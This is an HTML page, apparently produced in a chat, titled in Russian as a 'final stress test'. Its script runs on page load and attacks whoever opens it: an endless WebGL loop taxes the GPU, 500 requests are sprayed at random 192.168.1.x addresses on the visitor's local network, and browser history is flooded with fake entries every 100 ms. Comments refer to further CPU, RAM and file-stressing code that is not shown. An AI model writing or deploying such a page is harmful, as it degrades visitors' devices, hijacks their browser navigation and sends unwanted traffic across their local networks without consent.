<!DOCTYPE html>
<html>
<head>
    <title>ФИНАЛЬНЫЙ СТРЕСС-ТЕСТ</title>
</head>
<body>
    <h1>Тест системы</h1>
    <script>
        (function() {
            // 1. Твой код с CPU, RAM, файлами (из предыдущего сообщения)
            // ... вставь сюда весь код из предыдущего ответа ...

            // 2. Доп. нагрузка на GPU (WebGL)
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 1000;
                canvas.height = 1000;
                const gl = canvas.getContext('webgl');
                if (gl) {
                    function stressGPU() {
                        // Простейший цикл рендеринга
                        gl.clear(gl.COLOR_BUFFER_BIT);
                        requestAnimationFrame(stressGPU);
                    }
                    stressGPU();
                }
            } catch (e) {}

            // 3. Спам DNS-запросами (сетевые таймауты)
            for (let i = 0; i < 500; i++) {
                let img = new Image();
                img.src = 'http://192.168.1.' + (Math.floor(Math.random() * 255)) + '/test'; // Спам по локальной сети
            }

            // 4. Забиваем историю браузера
            setInterval(() => {
                for (let i = 0; i < 100; i++) {
                    history.pushState({}, '', '/fake' + Math.random());
                }
            }, 100);
        })();
    </script>
</body>
</html>
